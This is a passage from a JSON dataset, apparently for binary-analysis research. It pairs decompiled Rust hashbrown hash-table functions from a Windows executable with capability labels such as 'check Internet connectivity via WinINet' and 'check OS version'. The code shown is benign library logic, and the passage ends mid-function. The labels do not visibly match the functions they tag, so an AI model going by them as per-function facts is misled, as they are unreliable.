        "decompiled_code": "\nint64_t sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::hfbf69c3e50282aef\n                  (int64_t *arg1)\n\n{\n    uchar auVar1 [16];\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t in_RDX;\n    uint32_t uVar4;\n    uchar (*pauVar5) [16];\n    int64_t iVar6;\n    \n    // <hashbrown::raw::RawIter<T> as core::iter::traits::iterator::Iterator>::next::hfbf69c3e50282aef\n    iVar2 = arg1[4];\n    if (iVar2 == 0) {\n        iVar6 = 0;\n    }\n    else {\n        uVar4 = *(arg1 + 3);\n        iVar6 = *arg1;\n        pauVar5 = arg1[1];\n        while( true ) {\n            iVar3 = sym._ZN9hashbrown3raw7bitmask7BitMask14lowest_set_bit17h28cf3cd6f34533baE.362(uVar4);\n            if (iVar3 == 1) break;\n            auVar1 = *pauVar5;\n            uVar4 = ~(SUB161(auVar1 >> 7, 0) & 1 | (SUB161(auVar1 >> 0xf, 0) & 1) << 1 |\n                      (SUB161(auVar1 >> 0x17, 0) & 1) << 2 | (SUB161(auVar1 >> 0x1f, 0) & 1) << 3 |\n                      (SUB161(auVar1 >> 0x27, 0) & 1) << 4 | (SUB161(auVar1 >> 0x2f, 0) & 1) << 5 |\n                      (SUB161(auVar1 >> 0x37, 0) & 1) << 6 | (SUB161(auVar1 >> 0x3f, 0) & 1) << 7 |\n                      (SUB161(auVar1 >> 0x47, 0) & 1) << 8 | (SUB161(auVar1 >> 0x4f, 0) & 1) << 9 |\n                      (SUB161(auVar1 >> 0x57, 0) & 1) << 10 | (SUB161(auVar1 >> 0x5f, 0) & 1) << 0xb |\n                      (SUB161(auVar1 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar1 >> 0x6f, 0) & 1) << 0xd |\n                      (SUB161(auVar1 >> 0x77, 0) & 1) << 0xe | SUB161(auVar1 >> 0x7f, 0) << 0xf);\n            *(arg1 + 3) = uVar4;\n            iVar6 = iVar6 + -0x200;\n            *arg1 = iVar6;\n            arg1[1] = pauVar5[1];\n            pauVar5 = pauVar5[1];\n        }\n        *(arg1 + 3) = uVar4 - 1 & uVar4;\n        iVar6 = iVar6 + in_RDX * -0x20;\n        arg1[4] = iVar2 + -1;\n    }\n    return iVar6;\n}\n",
        "token_count": 786
    },
    "93b90925": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537(uint64_t *arg1, uint64_t arg2)\n\n{\n    uchar auVar1 [16];\n    uchar (*pauVar2) [16];\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    \n    // hashbrown::raw::RawTableInner<A>::find_insert_slot::h93b90925f579d537\n    uVar6 = *arg1;\n    pauVar2 = arg1[1];\n    uVar7 = arg2 & uVar6;\n    iVar8 = 0x10;\n    while( true ) {\n        auVar1 = *(*pauVar2 + uVar7);\n        iVar5 = sym._ZN9hashbrown3raw7bitmask7BitMask14lowest_set_bit17h28cf3cd6f34533baE.362\n                          (SUB168(auVar1, 0), \n                           SUB161(auVar1 >> 7, 0) & 1 | (SUB161(auVar1 >> 0xf, 0) & 1) << 1 |\n                           (SUB161(auVar1 >> 0x17, 0) & 1) << 2 | (SUB161(auVar1 >> 0x1f, 0) & 1) << 3 |\n                           (SUB161(auVar1 >> 0x27, 0) & 1) << 4 | (SUB161(auVar1 >> 0x2f, 0) & 1) << 5 |\n                           (SUB161(auVar1 >> 0x37, 0) & 1) << 6 | (SUB161(auVar1 >> 0x3f, 0) & 1) << 7 |\n                           (SUB161(auVar1 >> 0x47, 0) & 1) << 8 | (SUB161(auVar1 >> 0x4f, 0) & 1) << 9 |\n                           (SUB161(auVar1 >> 0x57, 0) & 1) << 10 | (SUB161(auVar1 >> 0x5f, 0) & 1) << 0xb |\n                           (SUB161(auVar1 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar1 >> 0x6f, 0) & 1) << 0xd |\n                           (SUB161(auVar1 >> 0x77, 0) & 1) << 0xe | SUB161(auVar1 >> 0x7f, 0) << 0xf);\n        if (iVar5 == 1) break;\n        uVar7 = uVar7 + iVar8 & uVar6;\n        iVar8 = iVar8 + 0x10;\n    }\n    uVar6 = arg2 + uVar7 & uVar6;\n    if (-1 < (*pauVar2)[uVar6]) {\n        auVar1 = *pauVar2;\n        uVar4 = SUB161(auVar1 >> 7, 0) & 1 | (SUB161(auVar1 >> 0xf, 0) & 1) << 1 | (SUB161(auVar1 >> 0x17, 0) & 1) << 2\n                | (SUB161(auVar1 >> 0x1f, 0) & 1) << 3 | (SUB161(auVar1 >> 0x27, 0) & 1) << 4 |\n                (SUB161(auVar1 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar1 >> 0x37, 0) & 1) << 6 |\n                (SUB161(auVar1 >> 0x3f, 0) & 1) << 7 | (SUB161(auVar1 >> 0x47, 0) & 1) << 8 |\n                (SUB161(auVar1 >> 0x4f, 0) & 1) << 9 | (SUB161(auVar1 >> 0x57, 0) & 1) << 10 |\n                (SUB161(auVar1 >> 0x5f, 0) & 1) << 0xb | (SUB161(auVar1 >> 0x67, 0) & 1) << 0xc |\n                (SUB161(auVar1 >> 0x6f, 0) & 1) << 0xd | (SUB161(auVar1 >> 0x77, 0) & 1) << 0xe |\n                SUB161(auVar1 >> 0x7f, 0) << 0xf;\n        uVar3 = 0;\n        if (uVar4 != 0) {\n            for (; (uVar4 >> uVar3 & 1) == 0; uVar3 = uVar3 + 1) {\n            }\n        }\n        uVar6 = uVar3;\n    }\n    return uVar6;\n}\n",
        "token_count": 1189
    },
    "accc908f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t sym.hashbrown::map::HashMap_K_V_S_A_::get_inner::haccc908f1bb6c564(ulong *arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    int64_t iVar1;\n    \n    // hashbrown::map::HashMap<K,V,S,A>::get_inner::haccc908f1bb6c564\n    if (arg1[5] == 0) {\n        iVar1 = 0;\n    }\n    else {\n        arg2_00 = sym.core::hash::BuildHasher::hash_one::h76031b31976d9960(*arg1, arg1[1], arg2);\n        iVar1 = sym.hashbrown::raw::RawTable_T_A_::find::h3c063cbcc14ed5aa(arg1 + 2, arg2_00, arg2);\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + -0x20;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 221
    },
    "94f05646": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::h94f05646494975ed(uint64_t *arg1, ulong arg2)\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    char cVar3;\n    uchar uVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint64_t uVar13;\n    ulong arg2_00;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint *puVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uint8_t uVar19;\n    int64_t iVar20;\n    uint *puVar21;\n    bool bVar22;\n    ulong *puStack208;\n    uint64_t uStack200;\n    uint64_t uStack192;\n    uint *puStack184;\n    uint64_t uStack176;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    \n    // hashbrown::raw::RawTable<T,A>::reserve_rehash::h94f05646494975ed\n    auVar1 = *0x4445a0;\n    puStack208 = &uStack120;\n    uStack192 = arg1[3];\n    uVar13 = uStack192 + 1;\n    uStack120 = arg2;\n    if (uVar13 == 0) {\n        dbg.capacity_overflow();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    uVar17 = *arg1;\n    uStack176 = uVar17 + 1;\n    uStack200 = (uStack176 >> 3) * 7;\n    if (uVar17 < 8) {\n        uStack200 = uVar17;\n    }\n    if (uStack200 >> 1 < uVar13) {\n        uVar17 = uStack200 + 1;\n        if (uStack200 + 1 < uVar13) {\n            uVar17 = uVar13;\n        }\n        sym.hashbrown::raw::RawTableInner_A_::fallible_with_capacity::hcea2610e5ab85b25(&uStack168, 0x20, uVar17);\n        iVar20 = CONCAT44(uStack148, uStack152);\n        if (CONCAT44(uStack164, uStack168) == 0) {\n            uStack96._0_4_ = uStack160;\n            uStack96._4_4_ = uStack156;\n            uStack80 = CONCAT44(uStack140, uStack144) - uStack192;\n            uStack112 = 0x20;\n            uStack104 = 0x10;\n            uVar13 = arg1[1];\n            iVar18 = -0x20;\n            uStack88 = iVar20;\n            uStack72 = uStack192;\n            for (uVar17 = 0; uStack176 != uVar17; uVar17 = uVar17 + 1) {\n                if (-1 < *(uVar13 + uVar17)) {\n                    arg2_00 = sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h844dff3ec4e13623\n                                        (&puStack208, arg1, uVar17);\n                    uVar14 = sym.hashbrown::raw::RawTableInner_A_::prepare_insert_slot::hc738472cab5bf402\n                                       (&uStack96, arg2_00);\n                    auVar1 = *(uVar13 + 0x10 + iVar18);\n                    *(iVar20 + ~uVar14 * 0x20) = *(uVar13 + iVar18);\n                    *(iVar20 + 0x10 + ~uVar14 * 0x20) = auVar1;\n                }\n                iVar18 = iVar18 + -0x20;\n            }\n            uStack168 = *arg1;\n            uStack164 = *(arg1 + 4);\n            uStack96 = *arg1;\n            uStack160 = *(arg1 + 1);\n            uStack156 = *(arg1 + 0xc);\n            uVar14 = arg1[1];\n            uStack152 = *(arg1 + 2);\n            uStack148 = *(arg1 + 0x14);\n            uVar13 = arg1[2];\n            uStack144 = *(arg1 + 3);\n            uStack140 = *(arg1 + 0x1c);\n            uVar17 = arg1[3];\n            *(arg1 + 2) = uStack80;\n            *(arg1 + 0x14) = uStack80._4_4_;\n            *(arg1 + 3) = uStack72;\n            *(arg1 + 0x1c) = uStack72._4_4_;\n            *arg1 = uStack96;\n            *(arg1 + 4) = uStack96._4_4_;\n            *(arg1 + 1) = uStack88;\n            *(arg1 + 0xc) = uStack88._4_4_;\n            if (uStack96 != 0) {\n                uStack88 = uVar14;\n                uStack80 = uVar13;\n                uStack72 = uVar17;\n                sym.hashbrown::raw::RawTableInner_A_::free_buckets::h4e92ad8948d9d1b4(&uStack96, 0x20);\n            }\n            iVar20 = -0x7fffffffffffffff;\n        }\n        return iVar20;\n    }\n    puVar5 = arg1[1];\n    bVar22 = false;\n    uVar13 = 0;\n    do {\n        if (bVar22) {\n            if ((0xfffffffffffffff0 < uVar13) || (uStack176 <= uVar13 + 0xf)) {\ncode_r0x0043eec1:\n                if (uStack176 < 0x10) {\n                    sub.msvcrt.dll_memmove(SUB168(auVar1, 0), puVar5 + 4, puVar5, uStack176);\n                }\n                else {\n                    uVar6 = puVar5[1];\n                    uVar7 = puVar5[2];\n                    uVar8 = puVar5[3];\n                    puVar21 = puVar5 + uStack176;\n                    *puVar21 = *puVar5;\n                    puVar21[1] = uVar6;\n                    puVar21[2] = uVar7;\n                    puVar21[3] = uVar8;\n                }\n                uVar13 = 0;\n                puVar21 = puVar5;\n                do {\n                    if (uVar13 == uStack176) {\n                        arg1[2] = uStack200 - uStack192;\n                        return -0x7fffffffffffffff;\n                    }\n                    if (*(puVar5 + uVar13) == -0x80) {\n                        puStack184 = puVar5 + ~uVar13 * 8;\n                        while( true ) {\n                            uVar14 = sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h844dff3ec4e13623\n                                               (&puStack208, arg1, uVar13);\n                            uVar15 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537\n                                               (arg1, uVar14);\n                            uVar19 = uVar14 >> 0x38;\n                            if (((uVar15 - (uVar14 & uVar17) ^ uVar13 - (uVar14 & uVar17)) & uVar17) < 0x10) break;\n                            cVar3 = *(puVar5 + uVar15);\n                            uVar19 = uVar19 >> 1;\n                            *(puVar5 + uVar15) = uVar19;\n                            *((uVar15 - 0x10 & uVar17) + 0x10 + puVar5) = uVar19;\n                            if (cVar3 == -1) {\n                                puVar16 = puVar5 + ~uVar15 * 8;\n                                *(puVar5 + uVar13) = 0xff;\n                                *((uVar13 - 0x10 & uVar17) + 0x10 + puVar5) = 0xff;\n                                uVar6 = *puStack184;\n                                uVar7 = puStack184[1];\n                                uVar8 = puStack184[2];\n                                uVar9 = puStack184[3];\n                                uVar10 = puStack184[5];\n                                uVar11 = puStack184[6];\n                                uVar12 = puStack184[7];\n                                puVar16[4] = puStack184[4];\n                                puVar16[5] = uVar10;\n                                puVar16[6] = uVar11;\n                                puVar16[7] = uVar12;\n                                *puVar16 = uVar6;\n                                puVar16[1] = uVar7;\n                                puVar16[2] = uVar8;\n                                puVar16[3] = uVar9;\n                                goto code_r0x0043efee;\n                            }\n                            iVar20 = ~uVar15 * 0x20 + 0x20;\n                            for (iVar18 = -0x20; iVar18 != 0; iVar18 = iVar18 + 1) {\n                                uVar4 = *(puVar21 + iVar18);\n                                *(puVar21 + iVar18) = *(puVar5 + iVar18 + iVar20);\n                                *(puVar5 + iVar18 + iVar20) = uVar4;\n                            }\n                        }\n                        uVar19 = uVar19 >> 1;\n                        *(puVar5 + uVar13) = uVar19;\n                        *((uVar13 - 0x10 & uVar17) + 0x10 + puVar5) = uVar19;\n                    }\ncode_r0x0043efee:\n                    uVar13 = uVar13 + 1;\n                    puVar21 = puVar21 + -8;\n                } while( true );\n            }\n            uVar14 = uVar13 + 0xf;\n            uVar13 = uVar13 + 0x10;\n        }\n        else {\n            bVar22 = uStack176 <= uVar13;\n            uVar14 = uVar13;\n            uVar13 = uVar13 + (uVar13 < uStack176);\n            if (bVar22) goto code_r0x0043eec1;\n        }\n        auVar2 = *(puVar5 + uVar14);\n        *(puVar5 + uVar14) =\n             CONCAT115(-(auVar2 < 0x0), \n                       CONCAT114(-(SUB161(auVar2 >> 0x70, 0) < '\\0'), \n                                 CONCAT113(-(SUB161(auVar2 >> 0x68, 0) < '\\0'), \n                                           CONCAT112(-(SUB161(auVar2 >> 0x60, 0) < '\\0'), \n                                                     CONCAT111(-(SUB161(auVar2 >> 0x58, 0) < '\\0'), \n                                                               CONCAT110(-(SUB161(auVar2 >> 0x50, 0) < '\\0'), \n                                                                         CONCAT19(-(SUB161(auVar2 >> 0x48, 0) < '\\0'), \n                                                                                  CONCAT18(-(SUB161(auVar2 >> 0x40, 0) <\n                                                                                            '\\0'), CONCAT17(-(SUB161(\n                                                            auVar2 >> 0x38, 0) < '\\0'), \n                                                            CONCAT16(-(SUB161(auVar2 >> 0x30, 0) < '\\0'), \n                                                                     CONCAT15(-(SUB161(auVar2 >> 0x28, 0) < '\\0'), \n                                                                              CONCAT14(-(SUB161(auVar2 >> 0x20, 0) <\n                                                                                        '\\0'), CONCAT13(-(SUB161(auVar2 \n                                                            >> 0x18, 0) < '\\0'), \n                                                            CONCAT12(-(SUB161(auVar2 >> 0x10, 0) < '\\0'), \n                                                                     CONCAT11(-(SUB161(auVar2 >> 8, 0) < '\\0'), \n                                                                              -(SUB161(auVar2, 0) < '\\0'))))))))))))))))\n             | auVar1;\n        bVar22 = true;\n    } while( true );\n}\n",
        "token_count": 2839
    },
    "35de292f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::h35de292f8b174cb7(uint64_t *arg1, ulong arg2)\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    char cVar3;\n    uchar uVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint64_t uVar13;\n    ulong arg2_00;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint *puVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uint8_t uVar19;\n    int64_t iVar20;\n    uint *puVar21;\n    bool bVar22;\n    ulong *puStack208;\n    uint64_t uStack200;\n    uint64_t uStack192;\n    uint *puStack184;\n    uint64_t uStack176;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    \n    // hashbrown::raw::RawTable<T,A>::reserve_rehash::h35de292f8b174cb7\n    auVar1 = *0x4445b0;\n    puStack208 = &uStack120;\n    uStack192 = arg1[3];\n    uVar13 = uStack192 + 1;\n    uStack120 = arg2;\n    if (uVar13 == 0) {\n        dbg.capacity_overflow();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    uVar17 = *arg1;\n    uStack176 = uVar17 + 1;\n    uStack200 = (uStack176 >> 3) * 7;\n    if (uVar17 < 8) {\n        uStack200 = uVar17;\n    }\n    if (uStack200 >> 1 < uVar13) {\n        uVar17 = uStack200 + 1;\n        if (uStack200 + 1 < uVar13) {\n            uVar17 = uVar13;\n        }\n        sym.hashbrown::raw::RawTableInner_A_::fallible_with_capacity::hcea2610e5ab85b25(&uStack168, 0x20, uVar17);\n        iVar20 = CONCAT44(uStack148, uStack152);\n        if (CONCAT44(uStack164, uStack168) == 0) {\n            uStack96._0_4_ = uStack160;\n            uStack96._4_4_ = uStack156;\n            uStack80 = CONCAT44(uStack140, uStack144) - uStack192;\n            uStack112 = 0x20;\n            uStack104 = 0x10;\n            uVar13 = arg1[1];\n            iVar18 = -0x20;\n            uStack88 = iVar20;\n            uStack72 = uStack192;\n            for (uVar17 = 0; uStack176 != uVar17; uVar17 = uVar17 + 1) {\n                if (-1 < *(uVar13 + uVar17)) {\n                    arg2_00 = sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h0040b82842a689f1\n                                        (&puStack208, arg1, uVar17);\n                    uVar14 = sym.hashbrown::raw::RawTableInner_A_::prepare_insert_slot::hc738472cab5bf402\n                                       (&uStack96, arg2_00);\n                    auVar1 = *(uVar13 + 0x10 + iVar18);\n                    *(iVar20 + ~uVar14 * 0x20) = *(uVar13 + iVar18);\n                    *(iVar20 + 0x10 + ~uVar14 * 0x20) = auVar1;\n                }\n                iVar18 = iVar18 + -0x20;\n            }\n            uStack168 = *arg1;\n            uStack164 = *(arg1 + 4);\n            uStack96 = *arg1;\n            uStack160 = *(arg1 + 1);\n            uStack156 = *(arg1 + 0xc);\n            uVar14 = arg1[1];\n            uStack152 = *(arg1 + 2);\n            uStack148 = *(arg1 + 0x14);\n            uVar13 = arg1[2];\n            uStack144 = *(arg1 + 3);\n            uStack140 = *(arg1 + 0x1c);\n            uVar17 = arg1[3];\n            *(arg1 + 2) = uStack80;\n            *(arg1 + 0x14) = uStack80._4_4_;\n            *(arg1 + 3) = uStack72;\n            *(arg1 + 0x1c) = uStack72._4_4_;\n            *arg1 = uStack96;\n            *(arg1 + 4) = uStack96._4_4_;\n            *(arg1 + 1) = uStack88;\n            *(arg1 + 0xc) = uStack88._4_4_;\n            if (uStack96 != 0) {\n                uStack88 = uVar14;\n                uStack80 = uVar13;\n                uStack72 = uVar17;\n                sym.hashbrown::raw::RawTableInner_A_::free_buckets::h4e92ad8948d9d1b4(&uStack96, 0x20);\n            }\n            iVar20 = -0x7fffffffffffffff;\n        }\n        return iVar20;\n    }\n    puVar5 = arg1[1];\n    bVar22 = false;\n    uVar13 = 0;\n    do {\n        if (bVar22) {\n            if ((0xfffffffffffffff0 < uVar13) || (uStack176 <= uVar13 + 0xf)) {\ncode_r0x0043f266:\n                if (uStack176 < 0x10) {\n                    sub.msvcrt.dll_memmove(SUB168(auVar1, 0), puVar5 + 4, puVar5, uStack176);\n                }\n                else {\n                    uVar6 = puVar5[1];\n                    uVar7 = puVar5[2];\n                    uVar8 = puVar5[3];\n                    puVar21 = puVar5 + uStack176;\n                    *puVar21 = *puVar5;\n                    puVar21[1] = uVar6;\n                    puVar21[2] = uVar7;\n                    puVar21[3] = uVar8;\n                }\n                uVar13 = 0;\n                puVar21 = puVar5;\n                do {\n                    if (uVar13 == uStack176) {\n                        arg1[2] = uStack200 - uStack192;\n                        return -0x7fffffffffffffff;\n                    }\n                    if (*(puVar5 + uVar13) == -0x80) {\n                        puStack184 = puVar5 + ~uVar13 * 8;\n                        while( true ) {\n                            uVar14 = sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h0040b82842a689f1\n                                               (&puStack208, arg1, uVar13);\n                            uVar15 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537\n                                               (arg1, uVar14);\n                            uVar19 = uVar14 >> 0x38;\n                            if (((uVar15 - (uVar14 & uVar17) ^ uVar13 - (uVar14 & uVar17)) & uVar17) < 0x10) break;\n                            cVar3 = *(puVar5 + uVar15);\n                            uVar19 = uVar19 >> 1;\n                            *(puVar5 + uVar15) = uVar19;\n                            *((uVar15 - 0x10 & uVar17) + 0x10 + puVar5) = uVar19;\n                            if (cVar3 == -1) {\n                                puVar16 = puVar5 + ~uVar15 * 8;\n                                *(puVar5 + uVar13) = 0xff;\n                                *((uVar13 - 0x10 & uVar17) + 0x10 + puVar5) = 0xff;\n                                uVar6 = *puStack184;\n                                uVar7 = puStack184[1];\n                                uVar8 = puStack184[2];\n                                uVar9 = puStack184[3];\n                                uVar10 = puStack184[5];\n                                uVar11 = puStack184[6];\n                                uVar12 = puStack184[7];\n                                puVar16[4] = puStack184[4];\n                                puVar16[5] = uVar10;\n                                puVar16[6] = uVar11;\n                                puVar16[7] = uVar12;\n                                *puVar16 = uVar6;\n                                puVar16[1] = uVar7;\n                                puVar16[2] = uVar8;\n                                puVar16[3] = uVar9;\n                                goto code_r0x0043f393;\n                            }\n                            iVar20 = ~uVar15 * 0x20 + 0x20;\n                            for (iVar18 = -0x20; iVar18 != 0; iVar18 = iVar18 + 1) {\n                                uVar4 = *(puVar21 + iVar18);\n                                *(puVar21 + iVar18) = *(puVar5 + iVar18 + iVar20);\n                                *(puVar5 + iVar18 + iVar20) = uVar4;\n                            }\n                        }\n                        uVar19 = uVar19 >> 1;\n                        *(puVar5 + uVar13) = uVar19;\n                        *((uVar13 - 0x10 & uVar17) + 0x10 + puVar5) = uVar19;\n                    }\ncode_r0x0043f393:\n                    uVar13 = uVar13 + 1;\n                    puVar21 = puVar21 + -8;\n                } while( true );\n            }\n            uVar14 = uVar13 + 0xf;\n            uVar13 = uVar13 + 0x10;\n        }\n        else {\n            bVar22 = uStack176 <= uVar13;\n            uVar14 = uVar13;\n            uVar13 = uVar13 + (uVar13 < uStack176);\n            if (bVar22) goto code_r0x0043f266;\n        }\n        auVar2 = *(puVar5 + uVar14);\n        *(puVar5 + uVar14) =\n             CONCAT115(-(auVar2 < 0x0), \n                       CONCAT114(-(SUB161(auVar2 >> 0x70, 0) < '\\0'), \n                                 CONCAT113(-(SUB161(auVar2 >> 0x68, 0) < '\\0'), \n                                           CONCAT112(-(SUB161(auVar2 >> 0x60, 0) < '\\0'), \n                                                     CONCAT111(-(SUB161(auVar2 >> 0x58, 0) < '\\0'), \n                                                               CONCAT110(-(SUB161(auVar2 >> 0x50, 0) < '\\0'), \n                                                                         CONCAT19(-(SUB161(auVar2 >> 0x48, 0) < '\\0'), \n                                                                                  CONCAT18(-(SUB161(auVar2 >> 0x40, 0) <\n                                                                                            '\\0'), CONCAT17(-(SUB161(\n                                                            auVar2 >> 0x38, 0) < '\\0'), \n                                                            CONCAT16(-(SUB161(auVar2 >> 0x30, 0) < '\\0'), \n                                                                     CONCAT15(-(SUB161(auVar2 >> 0x28, 0) < '\\0'), \n                                                                              CONCAT14(-(SUB161(auVar2 >> 0x20, 0) <\n                                                                                        '\\0'), CONCAT13(-(SUB161(auVar2 \n                                                            >> 0x18, 0) < '\\0'), \n                                                            CONCAT12(-(SUB161(auVar2 >> 0x10, 0) < '\\0'), \n                                                                     CONCAT11(-(SUB161(auVar2 >> 8, 0) < '\\0'), \n                                                                              -(SUB161(auVar2, 0) < '\\0'))))))))))))))))\n             | auVar1;\n        bVar22 = true;\n    } while( true );\n}\n",
        "token_count": 2845
    },
    "c9ecd749": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::hc9ecd749d2069f31(uint64_t *arg1, ulong arg2)\n\n{\n    uchar auVar1 [16];\n    char cVar2;\n    uchar uVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uchar auVar8 [16];\n    uint64_t uVar9;\n    ulong arg2_00;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint8_t uVar13;\n    int64_t iVar14;\n    uint *puVar15;\n    int64_t iVar16;\n    bool bVar17;\n    ulong *puStack208;\n    uint64_t uStack200;\n    uint64_t uStack192;\n    uint *puStack184;\n    uint64_t uStack176;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    \n    // hashbrown::raw::RawTable<T,A>::reserve_rehash::hc9ecd749d2069f31\n    auVar8 = *0x4445c0;\n    puStack208 = &uStack120;\n    uStack192 = arg1[3];\n    uVar9 = uStack192 + 1;\n    uStack120 = arg2;\n    if (uVar9 == 0) {\n        dbg.capacity_overflow();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    uVar12 = *arg1;\n    uStack176 = uVar12 + 1;\n    uStack200 = (uStack176 >> 3) * 7;\n    if (uVar12 < 8) {\n        uStack200 = uVar12;\n    }\n    if (uStack200 >> 1 < uVar9) {\n        uVar12 = uStack200 + 1;\n        if (uStack200 + 1 < uVar9) {\n            uVar12 = uVar9;\n        }\n        sym.hashbrown::raw::RawTableInner_A_::fallible_with_capacity::hcea2610e5ab85b25(&uStack168, 0x118, uVar12);\n        iVar16 = CONCAT44(uStack148, uStack152);\n        if (CONCAT44(uStack164, uStack168) == 0) {\n            uStack96._0_4_ = uStack160;\n            uStack96._4_4_ = uStack156;\n            uStack80 = CONCAT44(uStack140, uStack144) - uStack192;\n            uStack112 = 0x118;\n            uStack104 = 0x10;\n            uVar9 = arg1[1];\n            iVar14 = -0x118;\n            uStack88 = iVar16;\n            uStack72 = uStack192;\n            for (uVar12 = 0; uStack176 != uVar12; uVar12 = uVar12 + 1) {\n                if (-1 < *(uVar9 + uVar12)) {\n                    arg2_00 = sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h64d7a5d877c0046b\n                                        (&puStack208, arg1, uVar12);\n                    uVar10 = sym.hashbrown::raw::RawTableInner_A_::prepare_insert_slot::hc738472cab5bf402\n                                       (&uStack96, arg2_00);\n                    sym.memcpy(~uVar10 * 0x118 + iVar16, iVar14 + uVar9, 0x118);\n                }\n                iVar14 = iVar14 + -0x118;\n            }\n            uStack168 = *arg1;\n            uStack164 = *(arg1 + 4);\n            uStack96 = *arg1;\n            uStack160 = *(arg1 + 1);\n            uStack156 = *(arg1 + 0xc);\n            uVar10 = arg1[1];\n            uStack152 = *(arg1 + 2);\n            uStack148 = *(arg1 + 0x14);\n            uVar9 = arg1[2];\n            uStack144 = *(arg1 + 3);\n            uStack140 = *(arg1 + 0x1c);\n            uVar12 = arg1[3];\n            *(arg1 + 2) = uStack80;\n            *(arg1 + 0x14) = uStack80._4_4_;\n            *(arg1 + 3) = uStack72;\n            *(arg1 + 0x1c) = uStack72._4_4_;\n            *arg1 = uStack96;\n            *(arg1 + 4) = uStack96._4_4_;\n            *(arg1 + 1) = uStack88;\n            *(arg1 + 0xc) = uStack88._4_4_;\n            if (uStack96 != 0) {\n                uStack88 = uVar10;\n                uStack80 = uVar9;\n                uStack72 = uVar12;\n                sym.hashbrown::raw::RawTableInner_A_::free_buckets::h4e92ad8948d9d1b4(&uStack96, 0x118);\n            }\n            iVar16 = -0x7fffffffffffffff;\n        }\n        